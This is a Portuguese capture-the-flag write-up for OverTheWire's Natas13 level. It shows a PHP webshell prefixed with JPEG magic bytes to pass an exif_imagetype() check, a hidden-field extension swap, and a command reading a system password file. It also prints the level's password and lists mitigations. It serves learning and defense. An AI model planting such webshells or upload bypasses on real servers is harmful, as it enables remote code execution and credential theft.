# Writeup — OverTheWire Natas13

**Desafio:** Natas13  
**Categoria:** Web Security / File Upload Bypass  
**Objetivo:** Contornar a validação de tipo de arquivo com magic bytes para fazer upload de um webshell PHP

---

## Descrição do Desafio

O natas13 é similar ao natas12 — um formulário de upload de arquivos — porém com uma validação adicional no servidor usando `exif_imagetype()`, que verifica se o arquivo enviado é realmente uma imagem.

---

## Análise da Vulnerabilidade

O código adiciona a seguinte verificação em relação ao natas12:

```php
if(!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

A função `exif_imagetype()` verifica apenas os **primeiros bytes** do arquivo — os chamados **magic bytes** — para determinar o tipo. Um arquivo JPEG começa com:

```
FF D8 FF
```

Se esses bytes estiverem presentes no início do arquivo, a função o aceita como imagem válida, **independente do conteúdo restante**. O PHP, por sua vez, executa qualquer código `<?php ?>` que encontrar no arquivo.

---

## Exploit — Passo a Passo

### Passo 1 — Criar o Webshell com Magic Bytes

Criei um arquivo `shell.php` com os magic bytes de JPEG no início, seguidos do código PHP malicioso:

```python
with open("shell.php", "wb") as f:
    f.write(b'\xFF\xD8\xFF')
    f.write(b'<?php system($_GET["cmd"]); ?>')
```

ou

```shell
echo -e '\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>' > shell.php
```

O arquivo começa com `FF D8 FF` (magic bytes de JPEG), enganando o `exif_imagetype()`, mas ainda contém código PHP executável.

---

### Passo 2 — Inspecionar o Formulário

Abri o natas13 no navegador e inspecionei o campo oculto do formulário:

```html
<input type="hidden" name="filename" value="abc123.jpg">
```

---

### Passo 3 — Trocar a Extensão

Editei o valor do campo oculto diretamente no DevTools:

```
abc123.jpg  →  abc123.php
```

---

### Passo 4 — Fazer o Upload do Shell

Com a extensão alterada, fiz upload do `shell.php`. O servidor validou os magic bytes, aceitou o arquivo como imagem e retornou o link:

```
The file has been uploaded to: /upload/[arquivo].php
```

---

### Passo 5 — Executar o Comando

Acessei a URL com o parâmetro `cmd`:

```
http://natas13.natas.labs.overthewire.org/upload/[arquivo].php?cmd=cat /etc/natas_webpass/natas14
```

**Senha obtida:**
```
A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```

---

## Diferença em relação ao Natas12

| | Natas12 | Natas13 |
|---|---|---|
| Valida extensão? | Não | Não |
| Valida tipo do arquivo? | Não | Sim (`exif_imagetype`) |
| Bypass necessário | Só trocar extensão | Magic bytes + trocar extensão |

---

## Conceitos Explorados

| Conceito | Descrição |
|---|---|
| Magic Bytes | Primeiros bytes do arquivo que identificam seu tipo real |
| exif_imagetype() bypass | Inserir magic bytes de JPEG no início de um script PHP |
| Unrestricted File Upload | Servidor não valida extensão do arquivo |
| Remote Code Execution (RCE) | Webshell executa comandos arbitrários no servidor |

---

## Conclusão

O natas13 demonstra que validações superficiais de tipo de arquivo — como checar apenas os magic bytes — são insuficientes. Um atacante pode facilmente prefixar qualquer arquivo com os bytes corretos para enganar a verificação.

**Mitigações corretas:**
- Validar extensão **e** magic bytes **e** MIME type em conjunto
- Armazenar uploads fora do webroot
- Renomear arquivos para um nome sem extensão executável
- Nunca confiar em qualquer dado vindo do cliente
